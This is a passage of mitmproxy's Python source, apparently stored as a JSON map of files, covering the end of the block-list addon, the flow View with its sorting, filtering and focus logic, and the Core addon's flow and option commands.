import Sequence\nfrom typing import NamedTuple\n\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy import version\nfrom mitmproxy.net.http.status_codes import NO_RESPONSE\nfrom mitmproxy.net.http.status_codes import RESPONSES\n\n\nclass BlockSpec(NamedTuple):\n    matches: flowfilter.TFilter\n    status_code: int\n\n\ndef parse_spec(option: str) -> BlockSpec:\n    \"\"\"\n    Parses strings in the following format, enforces number of segments:\n\n        /flow-filter/status\n\n    \"\"\"\n    sep, rem = option[0], option[1:]\n\n    parts = rem.lower().split(sep, 2)\n    if len(parts) != 2:\n        raise ValueError(\"Invalid number of parameters (2 are expected)\")\n    flow_patt, status = parts\n    try:\n        status_code = int(status)\n    except ValueError:\n        raise ValueError(f\"Invalid HTTP status code: {status}\")\n    flow_filter = flowfilter.parse(flow_patt)\n    if not RESPONSES.get(status_code):\n        raise ValueError(f\"Invalid HTTP status code: {status}\")\n\n    return BlockSpec(matches=flow_filter, status_code=status_code)\n\n\nclass BlockList:\n    def __init__(self) -> None:\n        self.items: list[BlockSpec] = []\n\n    def load(self, loader):\n        loader.add_option(\n            \"block_list\",\n            Sequence[str],\n            [],\n            \"\"\"\n            Block matching requests and return an empty response with the specified HTTP status.\n            Option syntax is \"/flow-filter/status-code\", where flow-filter describes\n            which requests this rule should be applied to and status-code is the HTTP status code to return for\n            blocked requests. The separator (\"/\" in the example) can be any character.\n            Setting a non-standard status code of 444 will close the connection without sending a response.\n            \"\"\",\n        )\n\n    def configure(self, updated):\n        if \"block_list\" in updated:\n            self.items = []\n            for option in ctx.options.block_list:\n                try:\n                    spec = parse_spec(option)\n                except ValueError as e:\n                    raise exceptions.OptionsError(\n                        f\"Cannot parse block_list option {option}: {e}\"\n                    ) from e\n                self.items.append(spec)\n\n    def request(self, flow: http.HTTPFlow) -> None:\n        if flow.response or flow.error or not flow.live:\n            return\n\n        for spec in self.items:\n            if spec.matches(flow):\n                flow.metadata[\"blocklisted\"] = True\n                if spec.status_code == NO_RESPONSE:\n                    flow.kill()\n                else:\n                    flow.response = http.Response.make(\n                        spec.status_code, headers={\"Server\": version.MITMPROXY}\n                    )\n", "mitmproxy/addons/view.py": "\"\"\"\nThe View:\n\n- Keeps track of a store of flows\n- Maintains a filtered, ordered view onto that list of flows\n- Exposes a number of signals so the view can be monitored\n- Tracks focus within the view\n- Exposes a settings store for flows that automatically expires if the flow is\n  removed from the store.\n\"\"\"\n\nimport collections\nimport logging\nimport re\nfrom collections.abc import Iterator\nfrom collections.abc import MutableMapping\nfrom collections.abc import Sequence\nfrom typing import Any\nfrom typing import Optional\n\nimport sortedcontainers\n\nimport mitmproxy.flow\nfrom mitmproxy import command\nfrom mitmproxy import connection\nfrom mitmproxy import ctx\nfrom mitmproxy import dns\nfrom mitmproxy import exceptions\nfrom mitmproxy import flowfilter\nfrom mitmproxy import hooks\nfrom mitmproxy import http\nfrom mitmproxy import io\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy.log import ALERT\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils import signals\n\n# The underlying sorted list implementation expects the sort key to be stable\n# for the lifetime of the object. However, if we sort by size, for instance,\n# the sort order changes as the flow progresses through its lifecycle. We\n# address this through two means:\n#\n# - Let order keys cache the sort value by flow ID.\n#\n# - Add a facility to refresh items in the list by removing and re-adding them\n# when they are updated.\n\n\nclass _OrderKey:\n    def __init__(self, view):\n        self.view = view\n\n    def generate(self, f: mitmproxy.flow.Flow) -> Any:  # pragma: no cover\n        pass\n\n    def refresh(self, f):\n        k = self._key()\n        old = self.view.settings[f][k]\n        new = self.generate(f)\n        if old != new:\n            self.view._view.remove(f)\n            self.view.settings[f][k] = new\n            self.view._view.add(f)\n            self.view.sig_view_refresh.send()\n\n    def _key(self):\n        return \"_order_%s\" % id(self)\n\n    def __call__(self, f):\n        if f.id in self.view._store:\n            k = self._key()\n            s = self.view.settings[f]\n            if k in s:\n                return s[k]\n            val = self.generate(f)\n            s[k] = val\n            return val\n        else:\n            return self.generate(f)\n\n\nclass OrderRequestStart(_OrderKey):\n    def generate(self, f: mitmproxy.flow.Flow) -> float:\n        return f.timestamp_created\n\n\nclass OrderRequestMethod(_OrderKey):\n    def generate(self, f: mitmproxy.flow.Flow) -> str:\n        if isinstance(f, http.HTTPFlow):\n            return f.request.method\n        elif isinstance(f, (tcp.TCPFlow, udp.UDPFlow)):\n            return f.type.upper()\n        elif isinstance(f, dns.DNSFlow):\n            return dns.op_codes.to_str(f.request.op_code)\n        else:\n            raise NotImplementedError()\n\n\nclass OrderRequestURL(_OrderKey):\n    def generate(self, f: mitmproxy.flow.Flow) -> str:\n        if isinstance(f, http.HTTPFlow):\n            return f.request.url\n        elif isinstance(f, (tcp.TCPFlow, udp.UDPFlow)):\n            return human.format_address(f.server_conn.address)\n        elif isinstance(f, dns.DNSFlow):\n            return f.request.questions[0].name if f.request.questions else \"\"\n        else:\n            raise NotImplementedError()\n\n\nclass OrderKeySize(_OrderKey):\n    def generate(self, f: mitmproxy.flow.Flow) -> int:\n        if isinstance(f, http.HTTPFlow):\n            size = 0\n            if f.request.raw_content:\n                size += len(f.request.raw_content)\n            if f.response and f.response.raw_content:\n                size += len(f.response.raw_content)\n            return size\n        elif isinstance(f, (tcp.TCPFlow, udp.UDPFlow)):\n            size = 0\n            for message in f.messages:\n                size += len(message.content)\n            return size\n        elif isinstance(f, dns.DNSFlow):\n            return f.response.size if f.response else 0\n        else:\n            raise NotImplementedError()\n\n\norders = [\n    (\"t\", \"time\"),\n    (\"m\", \"method\"),\n    (\"u\", \"url\"),\n    (\"z\", \"size\"),\n]\n\n\ndef _signal_with_flow(flow: mitmproxy.flow.Flow) -> None: ...\n\n\ndef _sig_view_remove(flow: mitmproxy.flow.Flow, index: int) -> None: ...\n\n\nclass View(collections.abc.Sequence):\n    def __init__(self) -> None:\n        super().__init__()\n        self._store: collections.OrderedDict[str, mitmproxy.flow.Flow] = (\n            collections.OrderedDict()\n        )\n        self.filter = flowfilter.match_all\n        # Should we show only marked flows?\n        self.show_marked = False\n\n        self.default_order = OrderRequestStart(self)\n        self.orders = dict(\n            time=OrderRequestStart(self),\n            method=OrderRequestMethod(self),\n            url=OrderRequestURL(self),\n            size=OrderKeySize(self),\n        )\n        self.order_key: _OrderKey = self.default_order\n        self.order_reversed = False\n        self.focus_follow = False\n\n        self._view = sortedcontainers.SortedListWithKey(key=self.order_key)\n\n        # The sig_view* signals broadcast events that affect the view. That is,\n        # an update to a flow in the store but not in the view does not trigger\n        # a signal. All signals are called after the view has been updated.\n        self.sig_view_update = signals.SyncSignal(_signal_with_flow)\n        self.sig_view_add = signals.SyncSignal(_signal_with_flow)\n        self.sig_view_remove = signals.SyncSignal(_sig_view_remove)\n        # Signals that the view should be refreshed completely\n        self.sig_view_refresh = signals.SyncSignal(lambda: None)\n\n        # The sig_store* signals broadcast events that affect the underlying\n        # store. If a flow is removed from just the view, sig_view_remove is\n        # triggered. If it is removed from the store while it is also in the\n        # view, both sig_store_remove and sig_view_remove are triggered.\n        self.sig_store_remove = signals.SyncSignal(_signal_with_flow)\n        # Signals that the store should be refreshed completely\n        self.sig_store_refresh = signals.SyncSignal(lambda: None)\n\n        self.focus = Focus(self)\n        self.settings = Settings(self)\n\n    def load(self, loader):\n        loader.add_option(\n            \"view_filter\", Optional[str], None, \"Limit the view to matching flows.\"\n        )\n        loader.add_option(\n            \"view_order\",\n            str,\n            \"time\",\n            \"Flow sort order.\",\n            choices=list(map(lambda c: c[1], orders)),\n        )\n        loader.add_option(\n            \"view_order_reversed\", bool, False, \"Reverse the sorting order.\"\n        )\n        loader.add_option(\n            \"console_focus_follow\", bool, False, \"Focus follows new flows.\"\n        )\n\n    def store_count(self):\n        return len(self._store)\n\n    def _rev(self, idx: int) -> int:\n        \"\"\"\n        Reverses an index, if needed\n        \"\"\"\n        if self.order_reversed:\n            if idx < 0:\n                idx = -idx - 1\n            else:\n                idx = len(self._view) - idx - 1\n                if idx < 0:\n                    raise IndexError\n        return idx\n\n    def __len__(self):\n        return len(self._view)\n\n    def __getitem__(self, offset) -> Any:\n        return self._view[self._rev(offset)]\n\n    # Reflect some methods to the efficient underlying implementation\n\n    def _bisect(self, f: mitmproxy.flow.Flow) -> int:\n        v = self._view.bisect_right(f)\n        return self._rev(v - 1) + 1\n\n    def index(\n        self, f: mitmproxy.flow.Flow, start: int = 0, stop: int | None = None\n    ) -> int:\n        return self._rev(self._view.index(f, start, stop))\n\n    def __contains__(self, f: Any) -> bool:\n        return self._view.__contains__(f)\n\n    def _order_key_name(self):\n        return \"_order_%s\" % id(self.order_key)\n\n    def _base_add(self, f):\n        self.settings[f][self._order_key_name()] = self.order_key(f)\n        self._view.add(f)\n\n    def _refilter(self):\n        self._view.clear()\n        for i in self._store.values():\n            if self.show_marked and not i.marked:\n                continue\n            if self.filter(i):\n                self._base_add(i)\n        self.sig_view_refresh.send()\n\n    \"\"\" View API \"\"\"\n\n    # Focus\n    @command.command(\"view.focus.go\")\n    def go(self, offset: int) -> None:\n        \"\"\"\n        Go to a specified offset. Positive offests are from the beginning of\n        the view, negative from the end of the view, so that 0 is the first\n        flow, -1 is the last flow.\n        \"\"\"\n        if len(self) == 0:\n            return\n        if offset < 0:\n            offset = len(self) + offset\n        if offset < 0:\n            offset = 0\n        if offset > len(self) - 1:\n            offset = len(self) - 1\n        self.focus.flow = self[offset]\n\n    @command.command(\"view.focus.next\")\n    def focus_next(self) -> None:\n        \"\"\"\n        Set focus to the next flow.\n        \"\"\"\n        if self.focus.index is not None:\n            idx = self.focus.index + 1\n            if self.inbounds(idx):\n                self.focus.flow = self[idx]\n        else:\n            pass\n\n    @command.command(\"view.focus.prev\")\n    def focus_prev(self) -> None:\n        \"\"\"\n        Set focus to the previous flow.\n        \"\"\"\n        if self.focus.index is not None:\n            idx = self.focus.index - 1\n            if self.inbounds(idx):\n                self.focus.flow = self[idx]\n        else:\n            pass\n\n    # Order\n    @command.command(\"view.order.options\")\n    def order_options(self) -> Sequence[str]:\n        \"\"\"\n        Choices supported by the view_order option.\n        \"\"\"\n        return list(sorted(self.orders.keys()))\n\n    @command.command(\"view.order.reverse\")\n    def set_reversed(self, boolean: bool) -> None:\n        self.order_reversed = boolean\n        self.sig_view_refresh.send()\n\n    @command.command(\"view.order.set\")\n    def set_order(self, order_key: str) -> None:\n        \"\"\"\n        Sets the current view order.\n        \"\"\"\n        if order_key not in self.orders:\n            raise exceptions.CommandError(\"Unknown flow order: %s\" % order_key)\n        key = self.orders[order_key]\n        self.order_key = key\n        newview = sortedcontainers.SortedListWithKey(key=key)\n        newview.update(self._view)\n        self._view = newview\n\n    @command.command(\"view.order\")\n    def get_order(self) -> str:\n        \"\"\"\n        Returns the current view order.\n        \"\"\"\n        order = \"\"\n        for k in self.orders.keys():\n            if self.order_key == self.orders[k]:\n                order = k\n        return order\n\n    # Filter\n    @command.command(\"view.filter.set\")\n    def set_filter_cmd(self, filter_expr: str) -> None:\n        \"\"\"\n        Sets the current view filter.\n        \"\"\"\n        filt = None\n        if filter_expr:\n            try:\n                filt = flowfilter.parse(filter_expr)\n            except ValueError as e:\n                raise exceptions.CommandError(str(e)) from e\n        self.set_filter(filt)\n\n    def set_filter(self, flt: flowfilter.TFilter | None):\n        self.filter = flt or flowfilter.match_all\n        self._refilter()\n\n    # View Updates\n    @command.command(\"view.clear\")\n    def clear(self) -> None:\n        \"\"\"\n        Clears both the store and view.\n        \"\"\"\n        self._store.clear()\n        self._view.clear()\n        self.sig_view_refresh.send()\n        self.sig_store_refresh.send()\n\n    @command.command(\"view.clear_unmarked\")\n    def clear_not_marked(self) -> None:\n        \"\"\"\n        Clears only the unmarked flows.\n        \"\"\"\n        for flow in self._store.copy().values():\n            if not flow.marked:\n                self._store.pop(flow.id)\n\n        self._refilter()\n        self.sig_store_refresh.send()\n\n    # View Settings\n    @command.command(\"view.settings.getval\")\n    def getvalue(self, flow: mitmproxy.flow.Flow, key: str, default: str) -> str:\n        \"\"\"\n        Get a value from the settings store for the specified flow.\n        \"\"\"\n        return self.settings[flow].get(key, default)\n\n    @command.command(\"view.settings.setval.toggle\")\n    def setvalue_toggle(self, flows: Sequence[mitmproxy.flow.Flow], key: str) -> None:\n        \"\"\"\n        Toggle a boolean value in the settings store, setting the value to\n        the string \"true\" or \"false\".\n        \"\"\"\n        updated = []\n        for f in flows:\n            current = self.settings[f].get(\"key\", \"false\")\n            self.settings[f][key] = \"false\" if current == \"true\" else \"true\"\n            updated.append(f)\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n\n    @command.command(\"view.settings.setval\")\n    def setvalue(\n        self, flows: Sequence[mitmproxy.flow.Flow], key: str, value: str\n    ) -> None:\n        \"\"\"\n        Set a value in the settings store for the specified flows.\n        \"\"\"\n        updated = []\n        for f in flows:\n            self.settings[f][key] = value\n            updated.append(f)\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n\n    # Flows\n    @command.command(\"view.flows.duplicate\")\n    def duplicate(self, flows: Sequence[mitmproxy.flow.Flow]) -> None:\n        \"\"\"\n        Duplicates the specified flows, and sets the focus to the first\n        duplicate.\n        \"\"\"\n        dups = [f.copy() for f in flows]\n        if dups:\n            self.add(dups)\n            self.focus.flow = dups[0]\n            logging.log(ALERT, \"Duplicated %s flows\" % len(dups))\n\n    @command.command(\"view.flows.remove\")\n    def remove(self, flows: Sequence[mitmproxy.flow.Flow]) -> None:\n        \"\"\"\n        Removes the flow from the underlying store and the view.\n        \"\"\"\n        for f in flows:\n            if f.id in self._store:\n                if f.killable:\n                    f.kill()\n                if f in self._view:\n                    # We manually pass the index here because multiple flows may have the same\n                    # sorting key, and we cannot reconstruct the index from that.\n                    idx = self._view.index(f)\n                    self._view.remove(f)\n                    self.sig_view_remove.send(flow=f, index=idx)\n                del self._store[f.id]\n                self.sig_store_remove.send(flow=f)\n        if len(flows) > 1:\n            logging.log(ALERT, \"Removed %s flows\" % len(flows))\n\n    @command.command(\"view.flows.resolve\")\n    def resolve(self, flow_spec: str) -> Sequence[mitmproxy.flow.Flow]:\n        \"\"\"\n        Resolve a flow list specification to an actual list of flows.\n        \"\"\"\n        if flow_spec == \"@all\":\n            return [i for i in self._store.values()]\n        if flow_spec == \"@focus\":\n            return [self.focus.flow] if self.focus.flow else []\n        elif flow_spec == \"@shown\":\n            return [i for i in self]\n        elif flow_spec == \"@hidden\":\n            return [i for i in self._store.values() if i not in self._view]\n        elif flow_spec == \"@marked\":\n            return [i for i in self._store.values() if i.marked]\n        elif flow_spec == \"@unmarked\":\n            return [i for i in self._store.values() if not i.marked]\n        elif re.match(r\"@[0-9a-f\\-,]{36,}\", flow_spec):\n            ids = flow_spec[1:].split(\",\")\n            return [i for i in self._store.values() if i.id in ids]\n        else:\n            try:\n                filt = flowfilter.parse(flow_spec)\n            except ValueError as e:\n                raise exceptions.CommandError(str(e)) from e\n            return [i for i in self._store.values() if filt(i)]\n\n    @command.command(\"view.flows.create\")\n    def create(self, method: str, url: str) -> None:\n        try:\n            req = http.Request.make(method.upper(), url)\n        except ValueError as e:\n            raise exceptions.CommandError(\"Invalid URL: %s\" % e)\n\n        c = connection.Client(\n            peername=(\"\", 0),\n            sockname=(\"\", 0),\n            timestamp_start=req.timestamp_start - 0.0001,\n        )\n        s = connection.Server(address=(req.host, req.port))\n\n        f = http.HTTPFlow(c, s)\n        f.request = req\n        f.request.headers[\"Host\"] = req.host\n        self.add([f])\n\n    @command.command(\"view.flows.load\")\n    def load_file(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Load flows into the view, without processing them with addons.\n        \"\"\"\n        try:\n            with open(path, \"rb\") as f:\n                for i in io.FlowReader(f).stream():\n                    # Do this to get a new ID, so we can load the same file N times and\n                    # get new flows each time. It would be more efficient to just have a\n                    # .newid() method or something.\n                    self.add([i.copy()])\n        except OSError as e:\n            logging.error(e.strerror)\n        except exceptions.FlowReadException as e:\n            logging.error(str(e))\n\n    def add(self, flows: Sequence[mitmproxy.flow.Flow]) -> None:\n        \"\"\"\n        Adds a flow to the state. If the flow already exists, it is\n        ignored.\n        \"\"\"\n        for f in flows:\n            if f.id not in self._store:\n                self._store[f.id] = f\n                if self.filter(f):\n                    self._base_add(f)\n                    if self.focus_follow:\n                        self.focus.flow = f\n                    self.sig_view_add.send(flow=f)\n\n    def get_by_id(self, flow_id: str) -> mitmproxy.flow.Flow | None:\n        \"\"\"\n        Get flow with the given id from the store.\n        Returns None if the flow is not found.\n        \"\"\"\n        return self._store.get(flow_id)\n\n    # View Properties\n    @command.command(\"view.properties.length\")\n    def get_length(self) -> int:\n        \"\"\"\n        Returns view length.\n        \"\"\"\n        return len(self)\n\n    @command.command(\"view.properties.marked\")\n    def get_marked(self) -> bool:\n        \"\"\"\n        Returns true if view is in marked mode.\n        \"\"\"\n        return self.show_marked\n\n    @command.command(\"view.properties.marked.toggle\")\n    def toggle_marked(self) -> None:\n        \"\"\"\n        Toggle whether to show marked views only.\n        \"\"\"\n        self.show_marked = not self.show_marked\n        self._refilter()\n\n    @command.command(\"view.properties.inbounds\")\n    def inbounds(self, index: int) -> bool:\n        \"\"\"\n        Is this 0 <= index < len(self)?\n        \"\"\"\n        return 0 <= index < len(self)\n\n    # Event handlers\n    def configure(self, updated):\n        if \"view_filter\" in updated:\n            filt = None\n            if ctx.options.view_filter:\n                try:\n                    filt = flowfilter.parse(ctx.options.view_filter)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            self.set_filter(filt)\n        if \"view_order\" in updated:\n            if ctx.options.view_order not in self.orders:\n                raise exceptions.OptionsError(\n                    \"Unknown flow order: %s\" % ctx.options.view_order\n                )\n            self.set_order(ctx.options.view_order)\n        if \"view_order_reversed\" in updated:\n            self.set_reversed(ctx.options.view_order_reversed)\n        if \"console_focus_follow\" in updated:\n            self.focus_follow = ctx.options.console_focus_follow\n\n    def requestheaders(self, f):\n        self.add([f])\n\n    def error(self, f):\n        self.update([f])\n\n    def response(self, f):\n        self.update([f])\n\n    def intercept(self, f):\n        self.update([f])\n\n    def resume(self, f):\n        self.update([f])\n\n    def kill(self, f):\n        self.update([f])\n\n    def tcp_start(self, f):\n        self.add([f])\n\n    def tcp_message(self, f):\n        self.update([f])\n\n    def tcp_error(self, f):\n        self.update([f])\n\n    def tcp_end(self, f):\n        self.update([f])\n\n    def udp_start(self, f):\n        self.add([f])\n\n    def udp_message(self, f):\n        self.update([f])\n\n    def udp_error(self, f):\n        self.update([f])\n\n    def udp_end(self, f):\n        self.update([f])\n\n    def dns_request(self, f):\n        self.add([f])\n\n    def dns_response(self, f):\n        self.update([f])\n\n    def dns_error(self, f):\n        self.update([f])\n\n    def update(self, flows: Sequence[mitmproxy.flow.Flow]) -> None:\n        \"\"\"\n        Updates a list of flows. If flow is not in the state, it's ignored.\n        \"\"\"\n        for f in flows:\n            if f.id in self._store:\n                if self.filter(f):\n                    if f not in self._view:\n                        self._base_add(f)\n                        if self.focus_follow:\n                            self.focus.flow = f\n                        self.sig_view_add.send(flow=f)\n                    else:\n                        # This is a tad complicated. The sortedcontainers\n                        # implementation assumes that the order key is stable. If\n                        # it changes mid-way Very Bad Things happen. We detect when\n                        # this happens, and re-fresh the item.\n                        self.order_key.refresh(f)\n                        self.sig_view_update.send(flow=f)\n                else:\n                    try:\n                        idx = self._view.index(f)\n                    except ValueError:\n                        pass  # The value was not in the view\n                    else:\n                        self._view.remove(f)\n                        self.sig_view_remove.send(flow=f, index=idx)\n\n\nclass Focus:\n    \"\"\"\n    Tracks a focus element within a View.\n    \"\"\"\n\n    def __init__(self, v: View) -> None:\n        self.view = v\n        self._flow: mitmproxy.flow.Flow | None = None\n        self.sig_change = signals.SyncSignal(lambda: None)\n        if len(self.view):\n            self.flow = self.view[0]\n        v.sig_view_add.connect(self._sig_view_add)\n        v.sig_view_remove.connect(self._sig_view_remove)\n        v.sig_view_refresh.connect(self._sig_view_refresh)\n\n    @property\n    def flow(self) -> mitmproxy.flow.Flow | None:\n        return self._flow\n\n    @flow.setter\n    def flow(self, f: mitmproxy.flow.Flow | None):\n        if f is not None and f not in self.view:\n            raise ValueError(\"Attempt to set focus to flow not in view\")\n        self._flow = f\n        self.sig_change.send()\n\n    @property\n    def index(self) -> int | None:\n        if self.flow:\n            return self.view.index(self.flow)\n        return None\n\n    @index.setter\n    def index(self, idx):\n        if idx < 0 or idx > len(self.view) - 1:\n            raise ValueError(\"Index out of view bounds\")\n        self.flow = self.view[idx]\n\n    def _nearest(self, f, v):\n        return min(v._bisect(f), len(v) - 1)\n\n    def _sig_view_remove(self, flow, index):\n        if len(self.view) == 0:\n            self.flow = None\n        elif flow is self.flow:\n            self.index = min(index, len(self.view) - 1)\n\n    def _sig_view_refresh(self):\n        if len(self.view) == 0:\n            self.flow = None\n        elif self.flow is None:\n            self.flow = self.view[0]\n        elif self.flow not in self.view:\n            self.flow = self.view[self._nearest(self.flow, self.view)]\n\n    def _sig_view_add(self, flow):\n        # We only have to act if we don't have a focus element\n        if not self.flow:\n            self.flow = flow\n\n\nclass Settings(collections.abc.Mapping):\n    def __init__(self, view: View) -> None:\n        self.view = view\n        self._values: MutableMapping[str, dict] = {}\n        view.sig_store_remove.connect(self._sig_store_remove)\n        view.sig_store_refresh.connect(self._sig_store_refresh)\n\n    def __iter__(self) -> Iterator:\n        return iter(self._values)\n\n    def __len__(self) -> int:\n        return len(self._values)\n\n    def __getitem__(self, f: mitmproxy.flow.Flow) -> dict:\n        if f.id not in self.view._store:\n            raise KeyError\n        return self._values.setdefault(f.id, {})\n\n    def _sig_store_remove(self, flow):\n        if flow.id in self._values:\n            del self._values[flow.id]\n\n    def _sig_store_refresh(self):\n        for fid in list(self._values.keys()):\n            if fid not in self.view._store:\n                del self._values[fid]\n", "mitmproxy/addons/core.py": "import logging\nimport os\nfrom collections.abc import Sequence\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import hooks\nfrom mitmproxy import optmanager\nfrom mitmproxy.log import ALERT\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.utils import emoji\n\nlogger = logging.getLogger(__name__)\n\nCONF_DIR = \"~/.mitmproxy\"\nLISTEN_PORT = 8080\n\n\nclass Core:\n    def configure(self, updated):\n        opts = ctx.options\n        if opts.add_upstream_certs_to_client_chain and not opts.upstream_cert:\n            raise exceptions.OptionsError(\n                \"add_upstream_certs_to_client_chain requires the upstream_cert option to be enabled.\"\n            )\n        if \"client_certs\" in updated:\n            if opts.client_certs:\n                client_certs = os.path.expanduser(opts.client_certs)\n                if not os.path.exists(client_certs):\n                    raise exceptions.OptionsError(\n                        f\"Client certificate path does not exist: {opts.client_certs}\"\n                    )\n\n    @command.command(\"set\")\n    def set(self, option: str, *value: str) -> None:\n        \"\"\"\n        Set an option. When the value is omitted, booleans are set to true,\n        strings and integers are set to None (if permitted), and sequences\n        are emptied. Boolean values can be true, false or toggle.\n        Multiple values are concatenated with a single space.\n        \"\"\"\n        if value:\n            specs = [f\"{option}={v}\" for v in value]\n        else:\n            specs = [option]\n        try:\n            ctx.options.set(*specs)\n        except exceptions.OptionsError as e:\n            raise exceptions.CommandError(e) from e\n\n    @command.command(\"flow.resume\")\n    def resume(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Resume flows if they are intercepted.\n        \"\"\"\n        intercepted = [i for i in flows if i.intercepted]\n        for f in intercepted:\n            f.resume()\n        ctx.master.addons.trigger(hooks.UpdateHook(intercepted))\n\n    # FIXME: this will become view.mark later\n    @command.command(\"flow.mark\")\n    def mark(self, flows: Sequence[flow.Flow], marker: mitmproxy.types.Marker) -> None:\n        \"\"\"\n        Mark flows.\n        \"\"\"\n        updated = []\n        if marker not in emoji.emoji:\n            raise exceptions.CommandError(f\"invalid marker value\")\n\n        for i in flows:\n            i.marked = marker\n            updated.append(i)\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n\n    # FIXME: this will become view.mark.toggle later\n    @command.command(\"flow.mark.toggle\")\n    def mark_toggle(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Toggle mark for flows.\n        \"\"\"\n        for i in flows:\n            if i.marked:\n                i.marked = \"\"\n            else:\n                i.marked = \":default:\"\n        ctx.master.addons.trigger(hooks.UpdateHook(flows))\n\n    @command.command(\"flow.kill\")\n    def kill(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Kill running flows.\n        \"\"\"\n        updated = []\n        for f in flows:\n            if f.killable:\n                f.kill()\n                updated.append(f)\n        logger.log(ALERT, \"Killed %s flows.\" % len(updated))\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n\n    # FIXME: this will become view.revert later\n    @command.command(\"flow.revert\")\n    def revert(self, flows: Sequence[flow.Flow]) -> None:\n        \"\"\"\n        Revert flow changes.\n        \"\"\"\n        updated = []\n        for f in flows:\n            if f.modified():\n                f.revert()\n                updated.append(f)\n        logger.log(ALERT, \"Reverted %s flows.\" % len(updated))\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n\n    @command.command(\"flow.set.options\")\n    def flow_set_options(self) -> Sequence[str]:\n        return [\n            \"host\",\n            \"status_code\",\n            \"method\",\n            \"path\",\n            \"url\",\n            \"reason\",\n        ]\n\n    @command.command(\"flow.set\")\n    @command.argument(\"attr\", type=mitmproxy.types.Choice(\"flow.set.options\"))\n    def flow_set(self, flows: Sequence[flow.Flow], attr: str, value: str) -> None:\n        \"\"\"\n        Quickly set a number of common values on flows.\n        \"\"\"\n        val: int | str = value\n        if attr == \"status_code\":\n            try:\n                val = int(val)  # type: ignore\n            except ValueError as v:\n                raise exceptions.CommandError(\n                    \"Status code is not an integer: %s\" % val\n                ) from v\n\n        updated = []\n        for f in flows:\n            req = getattr(f, \"request\", None)\n            rupdate = True\n            if req:\n                if attr == \"method\":\n                    req.method = val\n                elif attr == \"host\":\n                    req.host = val\n                elif attr == \"path\":\n                    req.path = val\n                elif attr == \"url\":\n                    try:\n                        req.url = val\n                    except ValueError as e:\n                        raise exceptions.CommandError(\n                            f\"URL {repr(val)} is invalid: {e}\"\n                        ) from e\n                else:\n                    self.rupdate = False\n\n            resp = getattr(f, \"response\", None)\n            supdate = True\n            if resp:\n                if attr == \"status_code\":\n                    resp.status_code = val\n                    if val in status_codes.RESPONSES:\n                        resp.reason = status_codes.RESPONSES[val]  # type: ignore\n                elif attr == \"reason\":\n                    resp.reason = val\n                else:\n                    supdate = False\n\n            if rupdate or supdate:\n                updated.append(f)\n\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n        logger.log(ALERT, f\"Set {attr} on  {len(updated)} flows.\")\n\n    @command.command(\"flow.decode\")\n    def decode(self, flows: Sequence[flow.Flow], part: str) -> None:\n        \"\"\"\n        Decode flows.\n        \"\"\"\n        updated = []\n        for f in flows:\n            p = getattr(f, part, None)\n            if p:\n                f.backup()\n                p.decode()\n                updated.append(f)\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n        logger.log(ALERT, \"Decoded %s flows.\" % len(updated))\n\n    @command.command(\"flow.encode.toggle\")\n    def encode_toggle(self, flows: Sequence[flow.Flow], part: str) -> None:\n        \"\"\"\n        Toggle flow encoding on and off, using deflate for encoding.\n        \"\"\"\n        updated = []\n        for f in flows:\n            p = getattr(f, part, None)\n            if p:\n                f.backup()\n                current_enc = p.headers.get(\"content-encoding\", \"identity\")\n                if current_enc == \"identity\":\n                    p.encode(\"deflate\")\n                else:\n                    p.decode()\n                updated.append(f)\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n        logger.log(ALERT, \"Toggled encoding on %s flows.\" % len(updated))\n\n    @command.command(\"flow.encode\")\n    @command.argument(\"encoding\", type=mitmproxy.types.Choice(\"flow.encode.options\"))\n    def encode(\n        self,\n        flows: Sequence[flow.Flow],\n        part: str,\n        encoding: str,\n    ) -> None:\n        \"\"\"\n        Encode flows with a specified encoding.\n        \"\"\"\n        updated = []\n        for f in flows:\n            p = getattr(f, part, None)\n            if p:\n                current_enc = p.headers.get(\"content-encoding\", \"identity\")\n                if current_enc == \"identity\":\n                    f.backup()\n                    p.encode(encoding)\n                    updated.append(f)\n        ctx.master.addons.trigger(hooks.UpdateHook(updated))\n        logger.log(ALERT, \"Encoded %s flows.\" % len(updated))\n\n    @command.command(\"flow.encode.options\")\n    def encode_options(self) -> Sequence[str]:\n        \"\"\"\n        The possible values for an encoding specification.\n        \"\"\"\n        return [\"gzip\", \"deflate\", \"br\", \"zstd\"]\n\n    @command.command(\"options.load\")\n    def options_load(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Load options from a file.\n        \"\"\"\n        try:\n            optmanager.load_paths(ctx.options, path)\n        except (OSError, exceptions.OptionsError) as e:\n            raise exceptions.CommandError(\"Could not load options - %s\" % e) from e\n\n    @command.command(\"options.save\")\n    def options_save(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Save options to a file.\n        \"\"\"\n        try:\n            optmanager.save(ctx.options, path)\n        except OSError as e:\n            raise exceptions.CommandError(\"Could not save options - %s\" % e) from e\n\n    @command.command(\"options.reset\")\n    def options_reset(self) -> None:\n        \"\"\"\n        Reset all options to defaults.\n        \"\"\"\n        ctx.options.reset()\n\n    @command.command(\"options.reset.one\")\n    def options_reset_one(self, name: str) -> None:\n        \"\"\"\n        Reset one option to its default value.\n        \"\"\"\n        if name not in ctx.options:\n            raise exceptions.CommandError(\"No such option: %s\" % name)\n        setattr(\n            ctx.options,\n            name,\n            ctx.options.default(name),\n        )\n", 